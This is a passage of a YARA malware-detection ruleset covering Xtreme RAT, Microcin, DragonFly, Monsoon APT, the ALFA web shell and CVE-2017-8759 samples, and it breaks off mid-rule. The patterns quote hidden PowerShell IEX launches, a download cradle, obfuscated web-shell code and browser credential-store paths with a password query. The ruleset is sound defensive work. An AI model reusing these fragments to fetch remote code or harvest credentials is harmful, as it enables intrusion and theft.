ascii\n      $x2 = \"[!] Received an ERROR in shell()\" fullword ascii\n      $x3 = \"Target IP address with backdoor installed\" fullword ascii\n      $x4 = \"Open backdoor port on target machine\" fullword ascii\n      $x5 = \"Backdoor port to open on victim machine\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule Susp_PowerShell_Sep17_1_RID2F9F : ANOMALY DEMO SCRIPT SUSP T1059 T1059_001 {\n   meta:\n      description = \"Detects suspicious PowerShell script in combo with VBS or JS \"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-30 12:05:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8e28521749165d2d48bfa1eac685c985ac15fc9ca5df177d4efadf9089395c56\"\n      tags = \"ANOMALY, DEMO, SCRIPT, SUSP, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Process.Create(\\\"powershell.exe -nop -w hidden\" fullword ascii nocase\n      $x2 = \".Run\\\"powershell.exe -nop -w hidden -c \\\"\\\"IEX \" ascii\n      $s1 = \"window.resizeTo 0,0\" fullword ascii\n   condition: \n      ( filesize < 2KB and 1 of them )\n}\n\nrule Susp_PowerShell_Sep17_2_RID2FA0 : ANOMALY DEMO FILE SCRIPT SUSP T1059 T1059_001 {\n   meta:\n      description = \"Detects suspicious PowerShell script in combo with VBS or JS \"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-30 12:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e387f6c7a55b85e0675e3b91e41e5814f5d0ae740b92f26ddabda6d4f69a8ca8\"\n      tags = \"ANOMALY, DEMO, FILE, SCRIPT, SUSP, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".Run \\\"powershell.exe -nop -w hidden -e \" ascii\n      $x2 = \"FileExists(path + \\\"\\\\..\\\\powershell.exe\\\")\" fullword ascii\n      $x3 = \"window.moveTo -4000, -4000\" fullword ascii\n      $s1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 20KB and ( ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or 2 of them )\n}\n\nrule Xtreme_Sep17_3_RID2C07 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f540a4cac716438da0c1c7b31661abf35136ea69b963e8f16846b96f8fd63dde\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Keylogg\" fullword ascii\n      $s4 = \"XTREME\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them )\n}\n\nrule Xtreme_Sep17_1_RID2C05 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"93c89044e8850721d39e935acd3fb693de154b7580d62ed460256cabb75599a6\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"ServerKeyloggerU\" fullword ascii\n      $x2 = \"TServerKeylogger\" fullword ascii\n      $x3 = \"XtremeKeylogger\" fullword wide\n      $x4 = \"XTREMEBINDER\" fullword wide\n      $s1 = \"shellexecute=\" fullword wide\n      $s2 = \"[Execute]\" fullword wide\n      $s3 = \";open=RECYCLER\\\\S-1-5-21-1482476501-3352491937-682996330-1013\\\\\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == \"735af2a144f62c50ba8e89c1c59764eb\" or ( 1 of ( $x* ) or 3 of them ) )\n}\n\nrule Xtreme_Sep17_2_RID2C06 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f8413827c52a5b073bdff657d6a277fdbfda29d909b4247982f6973424fa2dcc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Spy24.exe\" fullword wide\n      $s2 = \"Remote Service Application\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them )\n}\n\nrule Xtreme_RAT_Gen_Imp_RID2DCA : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 10:46:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7b5082bcc8487bb65c38e34c192c2a891e7bb86ba97281352b0837debee6f1cf\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"d0bdf112886f3d846cc7780967d8efb9\" or pe.imphash ( ) == \"cc6f630f214cf890e63e899d8ebabba6\" or pe.imphash ( ) == \"e0f7991d50ceee521d7190effa3c494e\" )\n}\n\nrule Microcin_Sample_1_RID2D96 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49816eefcd341d7a9c1715e1f89143862d4775ba4f9730397a1e8529f5f5e200\"\n      hash2 = \"a73f8f76a30ad5ab03dd503cc63de3a150e6ab75440c1060d75addceb4270f46\"\n      hash3 = \"9dd9bb13c2698159eb78a0ecb4e8692fd96ca4ecb50eef194fa7479cb65efb7c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"e Class Descriptor at (\" ascii\n      $s2 = \".?AVCAntiAntiAppleFrameRealClass@@\" fullword ascii\n      $s3 = \".?AVCAntiAntiAppleFrameBaseClass@@\" fullword ascii\n      $s4 = \".?AVCAppleBinRealClass@@\" fullword ascii\n      $s5 = \".?AVCAppleBinBaseClass@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 4 of them or pe.imphash ( ) == \"897077ca318eaf629cfe74569f10e023\" ) )\n}\n\nrule Microcin_Sample_2_RID2D97 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8a7d04229722539f2480270851184d75b26c375a77b468d8cbad6dbdb0c99271\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"[Pause]\" fullword ascii\n      $s7 = \"IconCache_%02d%02d%02d%02d%02d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule Microcin_Sample_3_RID2D98 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f74a3b67c5ed6f38f08786f1601214412249fe128f12c51525135710d681e1d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Lenovo\\\\Desktop\\\\test\\\\Release\\\\test.pdb\" fullword ascii\n      $s2 = \"test, Version 1.0\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule Microcin_Sample_4_RID2D99 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"92c01d5af922bdaacb6b0b2dfbe29e5cc58c45cbee5133932a499561dab616b8\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c dir /a /s \\\"%s\\\" > \\\"%s\\\"\" fullword wide\n      $s2 = \"ini.dat\" fullword wide\n      $s3 = \"winupdata\" fullword wide\n      $f1 = \"%s\\\\(%08x%08x)%s\" fullword wide\n      $f2 = \"%s\\\\d%08x\\\\d%08x.db\" fullword wide\n      $f3 = \"%s\\\\u%08x\\\\u%08x.db\" fullword wide\n      $f4 = \"%s\\\\h%08x\\\\h%08x.db\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or 5 of them )\n}\n\nrule Microcin_Sample_5_RID2D9A : DEMO EXE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b9c51397e79d5a5fd37647bc4e4ee63018ac3ab9d050b02190403eb717b1366e\"\n      tags = \"DEMO, EXE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Sorry, you are not fortuante ^_^, Please try other password dictionary \" fullword ascii\n      $x2 = \"DomCrack <IP> <UserName> <Password_Dic file path> <option>\" fullword ascii\n      $x3 = \"The password is \\\"%s\\\"         Time: %d(s)\" fullword ascii\n      $x4 = \"The password is \\\" %s \\\"         Time: %d(s)\" fullword ascii\n      $x5 = \"No password found!\" fullword ascii\n      $x7 = \"Can not found the Password Dictoonary file! \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them ) or 2 of them\n}\n\nrule Microcin_Sample_6_RID2D9B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cbd43e70dc55e94140099722d7b91b07a3997722d4a539ecc4015f37ea14a26e\"\n      hash2 = \"871ab24fd6ae15783dd9df5010d794b6121c4316b11f30a55f23ba37eef4b87a\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"** ERROR ** %s: %s\" fullword ascii\n      $s2 = \"TEMPDATA\" fullword wide\n      $s3 = \"Bruntime error \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}\n\nrule Sharpire_RID2A4F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Sharpire_RID2A4F.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/0xbadjuju/Sharpire_RID2A4F\"\n      date = \"2017-09-23 05:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"327a1dc2876cd9d7f6a5b3777373087296fc809d466e42861adcf09986c6e587\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\Sharpire_RID2A4F.pdb\" ascii\n      $x2 = \"[*] Upload of $fileName successful\" fullword wide\n      $s1 = \"no shell command supplied\" fullword wide\n      $s2 = \"/login/process.php\" fullword wide\n      $s3 = \"invokeShellCommand\" fullword ascii\n      $s4 = \"..Command execution completed.\" fullword wide\n      $s5 = \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" fullword wide\n      $s6 = \"/admin/get.php\" fullword wide\n      $s7 = \"[!] Error in stopping job: \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) and 3 of them ) )\n}\n\nrule Invoke_Metasploit_RID2DFE : DEMO HKTL METASPLOIT T1105 {\n   meta:\n      description = \"Detects Invoke-Metasploit Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1\"\n      date = \"2017-09-23 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b36d3ca7073741c8a48c578edaa6d3b6a8c3c4413e961a83ad08ad128b843e0b\"\n      tags = \"DEMO, HKTL, METASPLOIT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Looks like we're 64bit, using regular powershell.exe\" ascii wide\n      $s2 = \"[*] Kicking off download cradle in a new process\" \n      $s3 = \"Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'\" \n   condition: \n      ( filesize < 20KB and 1 of them )\n}\n\nrule ALFA_SHELL_RID29FC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects web shell often used by Iranian APT groups\"\n      author = \"Florian Roth\"\n      reference = \"http://getalfa.rf.gd/?i=1\"\n      date = \"2017-09-21 02:45:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')\" ascii\n      $x2 = \"#solevisible@gmail.com\" fullword ascii\n      $x3 = \"'login_page' => '500',//gui or 500 or 403 or 404\" fullword ascii\n      $x4 = \"$GLOBALS['__ALFA__']\" fullword ascii\n      $x5 = \"if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')\" ascii\n      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } \n   condition: \n      ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )\n}\n\nrule CVE_2017_8759_SOAP_Excel_RID2E36 : CVE_2017_8759 DEMO EXPLOIT OFFICE T1203 T1566_001 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/buffaloverflow/status/908455053345869825\"\n      date = \"2017-09-15 11:04:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2017_8759, DEMO, EXPLOIT, OFFICE, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"|'soap:wsdl=\" ascii wide nocase\n   condition: \n      ( filesize < 300KB and 1 of them )\n}\n\nrule CVE_2017_8759_Mal_HTA_RID2D09 : CVE_2017_8759 DEMO EXPLOIT FILE MAL T1203 T1566_001 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759 - file cmd.hta\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fee2ab286eb542c08fdfef29fabf7796a0a91083a0ee29ebae219168528294b5\"\n      tags = \"CVE_2017_8759, DEMO, EXPLOIT, FILE, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error = Process.Create(\\\"powershell -nop cmd.exe /c\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x683c and filesize < 1KB and all of them )\n}\n\nrule CVE_2017_8759_Mal_Doc_RID2D42 : CVE_2017_8759 DEMO EXPLOIT FILE MAL T1203 T1566_001 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759 - file Doc1.doc\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:24:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-21\"\n      hash1 = \"6314c5696af4c4b24c3a92b0e92a064aaf04fd56673e830f4d339b8805cc9635\"\n      tags = \"CVE_2017_8759, DEMO, EXPLOIT, FILE, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"soap:wsdl=http://\" ascii wide\n      $s2 = \"soap:wsdl=https://\" ascii wide\n      $s3 = \"soap:wsdl=http%3\" ascii wide\n      $s4 = \"soap:wsdl=https%3\" ascii wide\n      $c1 = \"Project.ThisDocument.AutoOpen\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and ( 1 of ( $s* ) and $c1 )\n}\n\nrule CVE_2017_8759_SOAP_via_JS_RID2E81 : CVE_2017_8759 DEMO EXPLOIT {\n   meta:\n      description = \"Detects SOAP WDSL Download via JavaScript\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/buffaloverflow/status/907728364278087680\"\n      date = \"2017-09-14 11:17:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2017_8759, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetObject(\\\"soap:wsdl=https://\" ascii wide nocase\n      $s2 = \"GetObject(\\\"soap:wsdl=http://\" ascii wide nocase\n   condition: \n      ( filesize < 3KB and 1 of them )\n}\n\nrule CVE_2017_8759_SOAP_txt_RID2DA5 : CVE_2017_8759 DEMO EXPLOIT T1203 T1566_001 {\n   meta:\n      description = \"Detects malicious file in releation with CVE-2017-8759 - file exploit.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"840ad14e29144be06722aff4cc04b377364eeed0a82b49cc30712823838e2444\"\n      tags = \"CVE_2017_8759, DEMO, EXPLOIT, T1203, T1566_001\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $s1 = /<soap:address location=\"http[s]?:\\/\\/[^\"]{8,140}.hta\"/ ascii wide\n      $s2 = /<soap:address location=\"http[s]?:\\/\\/[^\"]{8,140}mshta.exe\"/ ascii wide\n   condition: \n      ( filesize < 200KB and 1 of them )\n}\n\nrule Unspecified_Malware_Sep1_A1_RID3131 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 13:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"28143c7638f22342bff8edcd0bedd708e265948a5fcca750c302e2dca95ed9f0\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and pe.imphash ( ) == \"17a4bd9c95f2898add97f309fc6f9bcd\" )\n}\n\nrule DragonFly_APT_Sep17_1_RID2E5A : APT DEMO EXE FILE G0035 MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc54d8afd2ce5cb6cc53c46783bf91d0dd19de604308d536827320826bc36ed9\"\n      tags = \"APT, DEMO, EXE, FILE, G0035, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Update\\\\Temp\\\\ufiles.txt\" wide\n      $s2 = \"%02d.%02d.%04d %02d:%02d\" fullword wide\n      $s3 = \"*pass*.*\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule DragonFly_APT_Sep17_2_RID2E5B : APT DEMO EXE FILE G0035 MAL T1003 {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"178348c14324bc0a3e57559a01a6ae6aa0cb4013aabbe324b51f906dcf5d537e\"\n      tags = \"APT, DEMO, EXE, FILE, G0035, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data\" wide\n      $s2 = \"C:\\\\Users\\\\Public\\\\Log.txt\" fullword wide\n      $s3 = \"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins\" fullword wide\n      $s4 = \"***************** Mozilla Firefox ****************\" fullword wide\n      $s5 = \"********************** Opera *********************\" fullword wide\n      $s6 = \"\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\\" wide\n      $s7 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\\" wide\n      $s8 = \"**************** Internet Explorer ***************\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them )\n}\n\nrule DragonFly_APT_Sep17_3_RID2E5C : APT DEMO EXE FILE G0035 MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b051a5997267a5d7fa8316005124f3506574807ab2b25b037086e2e971564291\"\n      tags = \"APT, DEMO, EXE, FILE, G0035, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"kernel64.dll\" fullword ascii\n      $s2 = \"ws2_32.dQH\" fullword ascii\n      $s3 = \"HGFEDCBADCBA\" fullword ascii\n      $s4 = \"AWAVAUATWVSU\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( pe.imphash ( ) == \"6f03fb864ff388bac8680ac5303584be\" or all of them ) )\n}\n\nrule DragonFly_APT_Sep17_4_RID2E5D : APT DEMO EXE FILE G0035 MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f159b71183a69928ba8f26b76772ec504aefeac71021b012bd006162e133731\"\n      tags = \"APT, DEMO, EXE, FILE, G0035, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"screen.exe\" fullword wide\n      $s2 = \"PlatformInvokeUSER32\" fullword ascii\n      $s3 = \"GetDesktopImageF\" fullword ascii\n      $s4 = \"PlatformInvokeGDI32\" fullword ascii\n      $s5 = \"GetDesktopImage\" fullword ascii\n      $s6 = \"Too many arguments, going to store in current dir\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}\n\nrule WScriptShell_Case_Anomaly_RID30E0 : ANOMALY DEMO OBFUS SCRIPT SUSP T1059 {\n   meta:\n      description = \"Detects obfuscated wscript.shell commands\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-11 12:58:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-06-09\"\n      tags = \"ANOMALY, DEMO, OBFUS, SCRIPT, SUSP, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WScript.Shell\\\").Run\" nocase ascii wide\n      $sn1 = \"WScript.Shell\\\").Run\" ascii wide\n      $sn2 = \"wscript.shell\\\").run\" ascii wide\n      $sn3 = \"WSCRIPT.SHELL\\\").RUN\" ascii wide\n      $sn4 = \"Wscript.Shell\\\").Run\" ascii wide\n      $sn5 = \"WScript.shell\\\").Run\" ascii wide\n   condition: \n      filesize < 3000KB and #s1 > #sn1 + #sn2 + #sn3 + #sn4 + #sn5\n}\n\nrule Monsoon_APT_Malware_1_RID2EF6 : APT DEMO EXE FILE G0040 G0042 MAL {\n   meta:\n      description = \"Detects malware from Monsoon APT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n      date = \"2017-09-08 11:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"c9642f44d33e4c990066ce6fa0b0956ff5ace6534b64160004df31b9b690c9cd\"\n      tags = \"APT, DEMO, EXE, FILE, G0040, G0042, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"cmd.exe /c start \" fullword ascii\n      $s2 = \"\\\\Microsoft\\\\Templates\\\\\" ascii\n      $s3 = \"\\\\Microsoft\\\\Windows\\\\\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a0c824244f1d36ea1dd2759cf7599cd1\" or all of them ) )\n}\n\nrule Monsoon_APT_Malware_2_RID2EF7 : APT DEMO EXE FILE G0040 G0042 MAL {\n   meta:\n      description = \"Detects malware from Monsoon APT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n      date = \"2017-09-08 11:37:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"17c3d0fe08e1184c9737144fa065f4530def30d6591e5414a36463609f9aa53a\"\n      hash2 = \"8e0574ebf3dc640ac82987ab6ee2a02fc3dd5eaf4f6b5275272ba887acd15ac0\"\n      hash3 = \"bf93ca5f497fc7f38533d37fd4c083523ececc34aa2d3660d81014c0d9091ae3\"\n      tags = \"APT, DEMO, EXE, FILE, G0040, G0042, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Microsoft\\\\Windows\\\\coco.exe\" ascii\n      $x2 = \":\\\\System Volume Information\\\\config\" fullword ascii\n      $x3 = \" cscript.[BACKSPA[PAGE DO[CAPS LO[PAGE UPTPX498.dTPX499.d\" fullword wide\n      $s1 = \"\\\\Microsoft\\\\Templates\\\\msvcrt.dll\" ascii\n      $s2 